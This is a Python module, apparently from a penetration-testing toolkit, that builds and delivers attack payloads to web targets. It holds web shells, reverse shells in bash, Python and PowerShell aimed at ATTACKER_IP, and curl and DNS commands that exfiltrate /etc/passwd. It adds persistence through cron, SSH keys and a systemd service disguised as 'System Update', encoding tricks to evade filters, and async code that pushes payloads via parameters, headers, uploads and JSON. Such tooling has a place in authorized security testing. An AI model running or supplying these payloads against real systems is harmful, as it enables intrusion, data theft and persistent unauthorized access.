"""
Advanced payload delivery and execution engine.

This module implements sophisticated payload delivery mechanisms and
execution strategies for authorized penetration testing scenarios.
"""

import asyncio
import logging
import base64
import json
import hashlib
import tempfile
import os
from datetime import datetime
from typing import Dict, List, Optional, Set, Any, Tuple, Union
from urllib.parse import urljoin, urlparse, quote, unquote
import aiohttp
import aiofiles

from recon.collectors import BaseCollector


logger = logging.getLogger(__name__)


class PayloadDeliveryEngine:
    """Advanced payload delivery engine with multiple delivery methods."""
    
    def __init__(self):
        self.delivery_methods = self._load_delivery_methods()
        self.payload_templates = self._load_payload_templates()
        self.evasion_techniques = self._load_evasion_techniques()
    
    def _load_delivery_methods(self) -> Dict[str, Dict[str, Any]]:
        """Load payload delivery methods."""
        return {
            'http_parameter': {
                'description': 'Deliver payload via HTTP GET/POST parameters',
                'methods': ['GET', 'POST'],
                'encoding_support': True,
                'stealth_level': 'low'
            },
            'http_header': {
                'description': 'Deliver payload via HTTP headers',
                'headers': ['User-Agent', 'Referer', 'X-Forwarded-For', 'Cookie'],
                'encoding_support': True,
                'stealth_level': 'medium'
            },
            'file_upload': {
                'description': 'Deliver payload via file upload',
                'file_types': ['.php', '.asp', '.jsp', '.txt', '.jpg'],
                'encoding_support': False,
                'stealth_level': 'high'
            },
            'dns_exfiltration': {
                'description': 'Deliver payload via DNS queries',
                'subdomain_encoding': True,
                'encoding_support': True,
                'stealth_level': 'high'
            },
            'websocket': {
                'description': 'Deliver payload via WebSocket connection',
                'real_time': True,
                'encoding_support': True,
                'stealth_level': 'medium'
            },
            'json_api': {
                'description': 'Deliver payload via JSON API endpoints',
                'content_type': 'application/json',
                'encoding_support': True,
                'stealth_level': 'medium'
            }
        }
    
    def _load_payload_templates(self) -> Dict[str, Dict[str, Any]]:
        """Load payload templates for different purposes."""
        return {
            'web_shell': {
                'php': '<?php if(isset($_GET["cmd"])){echo shell_exec($_GET["cmd"]);} ?>',
                'asp': '<%eval request("cmd")%>',
                'jsp': '<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); %>',
                'description': 'Web shell for remote command execution'
            },
            'reverse_shell': {
                'bash': 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1',
                'python': 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'ATTACKER_IP\',ATTACKER_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
                'powershell': 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
                'description': 'Reverse shell for remote access'
            },
            'data_exfiltration': {
                'http_get': 'curl -X GET "http://ATTACKER_IP/exfil?data=$(cat /etc/passwd | base64 -w 0)"',
                'http_post': 'curl -X POST -d "data=$(cat /etc/passwd | base64 -w 0)" http://ATTACKER_IP/exfil',
                'dns': 'nslookup $(cat /etc/passwd | base64 -w 0 | cut -c1-60).ATTACKER_DOMAIN',
                'description': 'Data exfiltration payloads'
            },
            'persistence': {
                'cron_job': 'echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1\'" | crontab -',
                'ssh_key': 'mkdir -p ~/.ssh && echo "SSH_PUBLIC_KEY" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys',
                'service': 'echo "[Unit]\nDescription=System Update\n[Service]\nExecStart=/bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1\'\nRestart=always\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/update.service && systemctl enable update.service',
                'description': 'Persistence mechanisms'
            },
            'privilege_escalation': {
                'sudo_exploit': 'sudo -l && echo "Checking for sudo privileges"',
                'suid_search': 'find / -perm -4000 -type f 2>/dev/null',
                'kernel_exploit': 'uname -a && cat /proc/version',
                'description': 'Privilege escalation techniques'
            }
        }
    
    def _load_evasion_techniques(self) -> Dict[str, callable]:
        """Load evasion techniques for payload delivery."""
        return {
            'base64_encode': lambda p: base64.b64encode(p.encode()).decode(),
            'url_encode': lambda p: quote(p),
            'hex_encode': lambda p: ''.join(f'\\x{ord(c):02x}' for c in p),
            'unicode_encode': lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
            'rot13_encode': lambda p: p.encode('rot13') if isinstance(p, str) else p,
            'reverse_string': lambda p: p[::-1],
            'case_variation': lambda p: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
            'whitespace_insertion': lambda p: ' '.join(p[i:i+2] for i in range(0, len(p), 2)),
            'comment_insertion': lambda p: p.replace(' ', '/**/') if 'sql' in p.lower() else p
        }
    
    async def deliver_payload(self, payload_config: Dict[str, Any]) -> Dict[str, Any]:
        """Deliver payload using specified configuration."""
        
        delivery_results = {
            'payload_id': payload_config.get('id', ''),
            'target': payload_config.get('target', ''),
            'delivery_method': payload_config.get('delivery_method', ''),
            'payload_type': payload_config.get('payload_type', ''),
            'delivery_attempts': [],
            'success': False,
            'timestamp': datetime.utcnow().isoformat()
        }
        
        delivery_method = payload_config.get('delivery_method', 'http_parameter')
        payload = payload_config.get('payload', '')
        target_url = payload_config.get('target', '')
        
        if not payload or not target_url:
            delivery_results['error'] = 'Missing payload or target'
            return delivery_results
        
        # Apply evasion techniques if specified
        evasion_technique = payload_config.get('evasion_technique', 'none')
        if evasion_technique in self.evasion_techniques:
            try:
                payload = self.evasion_techniques[evasion_technique](payload)
            except Exception as e:
                logger.debug(f"Failed to apply evasion technique {evasion_technique}: {e}")
        
        # Attempt delivery based on method
        if delivery_method == 'http_parameter':
            result = await self._deliver_via_http_parameter(target_url, payload, payload_config)
        elif delivery_method == 'http_header':
            result = await self._deliver_via_http_header(target_url, payload, payload_config)
        elif delivery_method == 'file_upload':
            result = await self._deliver_via_file_upload(target_url, payload, payload_config)
        elif delivery_method == 'json_api':
            result = await self._deliver_via_json_api(target_url, payload, payload_config)
        else:
            result = {'success': False, 'error': f'Unsupported delivery method: {delivery_method}'}
        
        delivery_results['delivery_attempts'].append(result)
        delivery_results['success'] = result.get('success', False)
        
        return delivery_results
    
    async def _deliver_via_http_parameter(self, target_url: str, payload: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Deliver payload via HTTP parameter."""
        
        try:
            parameter_name = config.get('parameter', 'cmd')
            method = config.get('method', 'GET').upper()
            
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=30),
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                
                if method == 'GET':
                    params = {parameter_name: payload}
                    async with session.get(target_url, params=params) as response:
                        content = await response.text()
                        status_code = response.status
                
                elif method == 'POST':
                    data = {parameter_name: payload}
                    async with session.post(target_url, data=data) as response:
                        content = await response.text()
                        status_code = response.status
                
                else:
                    return {'success': False, 'error': f'Unsupported HTTP method: {method}'}
                
                return {
                    'success': True,
                    'method': 'http_parameter',
                    'status_code': status_code,
                    'response_length': len(content),
                    'parameter_used': parameter_name,
                    'timestamp': datetime.utcnow().isoformat()
                }
        
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'http_parameter'}
    
    async def _deliver_via_http_header(self, target_url: str, payload: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Deliver payload via HTTP header."""
        
        try:
            header_name = config.get('header', 'User-Agent')
            
            headers = {header_name: payload}
            
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=30),
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                
                async with session.get(target_url, headers=headers) as response:
                    content = await response.text()
                    status_code = response.status
                
                return {
                    'success': True,
                    'method': 'http_header',
                    'status_code': status_code,
                    'response_length': len(content),
                    'header_used': header_name,
                    'timestamp': datetime.utcnow().isoformat()
                }
        
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'http_header'}
    
    async def _deliver_via_file_upload(self, target_url: str, payload: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Deliver payload via file upload."""
        
        try:
            file_extension = config.get('file_extension', '.txt')
            filename = config.get('filename', f'payload{file_extension}')
            upload_parameter = config.get('upload_parameter', 'file')
            
            # Create temporary file with payload
            with tempfile.NamedTemporaryFile(mode='w', suffix=file_extension, delete=False) as temp_file:
                temp_file.write(payload)
                temp_file_path = temp_file.name
            
            try:
                async with aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=30),
                    connector=aiohttp.TCPConnector(ssl=False)
                ) as session:
                    
                    # Prepare multipart form data
                    data = aiohttp.FormData()
                    data.add_field(upload_parameter, 
                                 open(temp_file_path, 'rb'),
                                 filename=filename,
                                 content_type='application/octet-stream')
                    
                    async with session.post(target_url, data=data) as response:
                        content = await response.text()
                        status_code = response.status
                    
                    return {
                        'success': True,
                        'method': 'file_upload',
                        'status_code': status_code,
                        'response_length': len(content),
                        'filename': filename,
                        'timestamp': datetime.utcnow().isoformat()
                    }
            
            finally:
                # Clean up temporary file
                if os.path.exists(temp_file_path):
                    os.unlink(temp_file_path)
        
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'file_upload'}
    
    async def _deliver_via_json_api(self, target_url: str, payload: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Deliver payload via JSON API."""
        
        try:
            json_field = config.get('json_field', 'data')
            
            json_data = {json_field: payload}
            
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=30),
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                
                async with session.post(target_url, 
                                      json=json_data,
                                      headers={'Content-Type': 'application/json'}) as response:
                    content = await response.text()
                    status_code = response.status
                
                return {
                    'success': True,
                    'method': 'json_api',
                    'status_code': status_code,
                    'response_length': len(content),
                    'json_field': json_field,
                    'timestamp': datetime.utcnow().isoformat()
                }
        
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'json_api'}
    
    def generate_payload(self, payload_type: str, **kwargs) -> str:
        """Generate payload based on type and parameters."""
        
        if payload_type not in self.payload_templates:
            return ''
        
        template_group = self.payload_templates[payload_type]
        
        # Get specific template variant
        variant = kwargs.get('variant', list(template_group.keys())[0])
        if variant not in template_group:
            variant = list(template_group.keys())[0]
        
        template = template_group[variant]
        
        # Replace placeholders with actual values
        replacements = {
            'ATTACKER_IP': kwargs.get('attacker_ip', '127.0.0.1'),
            'ATTACKER_PORT': str(kwargs.get('attacker_port', 4444)),
            'ATTACKER_DOMAIN': kwargs.get('attacker_domain', 'attacker.com'),
            'SSH_PUBLIC_KEY': kwargs.get('ssh_public_key', 'ssh-rsa AAAAB3NzaC1yc2E...')
        }
        
        payload = template
        for placeholder, value in replacements.items():
            payload = payload.replace(placeholder, value)
        
        return payload


class PayloadExecutionEngine:
    """Engine for monitoring and managing payload execution."""
    
    def __init__(self):
        self.active_payloads = {}
        self.execution_results = []
    
    async def monitor_payload_execution(self, payload_id: str, monitoring_config: Dict[str, Any]) -> Dict[str, Any]:
        """Monitor payload execution and collect results."""
        
        monitoring_results = {
            'payload_id': payload_id,
            'monitoring_duration': monitoring_config.get('duration', 300),  # 5 minutes default
            'monitoring_methods': [],
            'execution_indicators': [],
            'success_indicators': [],
            'timestamp': datetime.utcnow().isoformat()
        }
        
        # Monitor different indicators based on payload type
        payload_type = monitoring_config.get('payload_type', '')
        
        if payload_type == 'web_shell':
            indicators = await self._monitor_web_shell(monitoring_config)
        elif payload_type == 'reverse_shell':
            indicators = await self._monitor_reverse_shell(monitoring_config)
        elif payload_type == 'data_exfiltration':
            indicators = await self._monitor_data_exfiltration(monitoring_config)
        else:
            indicators = await self._monitor_generic_execution(monitoring_config)
        
        monitoring_results['execution_indicators'] = indicators
        monitoring_results['success_indicators'] = [i for i in indicators if i.get('success', False)]
        
        return monitoring_results
    
    async def _monitor_web_shell(self, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Monitor web shell execution."""
        
        indicators = []
        web_shell_url = config.get('web_shell_url', '')
        
        if not web_shell_url:
            return indicators
        
        try:
            # Test web shell with simple command
            test_command = 'echo "WEBSHELL_TEST"'
            
            async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=30),
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                
                params = {'cmd': test_command}
                async with session.get(web_shell_url, params=params) as response:
                    content = await response.text()
                
                if 'WEBSHELL_TEST' in content:
                    indicators.append({
                        'type': 'web_shell_response',
                        'success': True,
                        'command': test_command,
                        'response': content[:200],  # Limit response length
                        'timestamp': datetime.utcnow().isoformat()
                    })
        
        except Exception as e:
            indicators.append({
                'type': 'web_shell_error',
                'success': False,
                'error': str(e),
                'timestamp': datetime.utcnow().isoformat()
            })
        
        return indicators
    
    async def _monitor_reverse_shell(self, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Monitor reverse shell connections."""
        
        indicators = []
        listen_port = config.get('listen_port', 4444)
        
        # Note: In a real implementation, this would set up a listener
        # For safety, we'll just simulate the monitoring
        
        indicators.append({
            'type': 'reverse_shell_listener',
            'success': False,  # Simulated - would be True if connection received
            'listen_port': listen_port,
            'note': 'Simulated monitoring - would listen for incoming connections',
            'timestamp': datetime.utcnow().isoformat()
        })
        
        return indicators
    
    async def _monitor_data_exfiltration(self, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Monitor data exfiltration attempts."""
        
        indicators = []
        
        # Monitor for HTTP requests to exfiltration endpoint
        exfil_endpoint = config.get('exfil_endpoint', '')
        
        if exfil_endpoint:
            indicators.append({
                'type': 'exfiltration_endpoint',
                'success': False,  # Simulated
                'endpoint': exfil_endpoint,
                'note': 'Simulated monitoring - would check for incoming data',
                'timestamp': datetime.utcnow().isoformat()
            })
        
        return indicators
    
    async def _monitor_generic_execution(self, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Monitor generic payload execution."""
        
        indicators = []
        
        indicators.append({
            'type': 'generic_execution',
            'success': False,  # Simulated
            'note': 'Generic execution monitoring - would check for payload-specific indicators',
            'timestamp': datetime.utcnow().isoformat()
        })
        
        return indicators


class PayloadDeliveryCollector(BaseCollector):
    """Payload delivery collector for exploitation operations."""
    
    def __init__(self):
        super().__init__("payload_delivery")
        self.delivery_engine = PayloadDeliveryEngine()
        self.execution_engine = PayloadExecutionEngine()
    
    async def collect(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Execute payload delivery operations."""
        
        payload_configs = kwargs.get('payload_configs', [])
        
        if not payload_configs:
            return []
        
        # Execute payload delivery for each configuration
        for config in payload_configs:
            try:
                # Set target if not specified
                if 'target' not in config:
                    config['target'] = target
                
                # Deliver payload
                delivery_result = await self.delivery_engine.deliver_payload(config)
                
                self.add_result({
                    'type': 'payload_delivery_result',
                    'target': target,
                    'delivery': delivery_result
                })
                
                # Monitor execution if requested
                if config.get('monitor_execution', False) and delivery_result.get('success', False):
                    monitoring_config = config.get('monitoring_config', {})
                    monitoring_config['payload_type'] = config.get('payload_type', '')
                    
                    execution_result = await self.execution_engine.monitor_payload_execution(
                        delivery_result.get('payload_id', ''),
                        monitoring_config
                    )
                    
                    self.add_result({
                        'type': 'payload_execution_result',
                        'target': target,
                        'execution': execution_result
                    })
            
            except Exception as e:
                logger.error(f"Failed to deliver payload: {e}")
                continue
        
        return self.results


# Standalone usage
if __name__ == "__main__":
    async def test_payload_delivery():
        collector = PayloadDeliveryCollector()
        
        test_configs = [
            {
                'id': 'test_1',
                'payload_type': 'web_shell',
                'delivery_method': 'http_parameter',
                'payload': '<?php echo "TEST"; ?>',
                'parameter': 'cmd',
                'method': 'GET'
            }
        ]
        
        results = await collector.collect(
            "https://httpbin.org/get",
            payload_configs=test_configs
        )
        
        print(f"Payload delivery completed with {len(results)} results")
        for result in results:
            print(f"- {result.get('type')}: {result}")
    
    asyncio.run(test_payload_delivery())
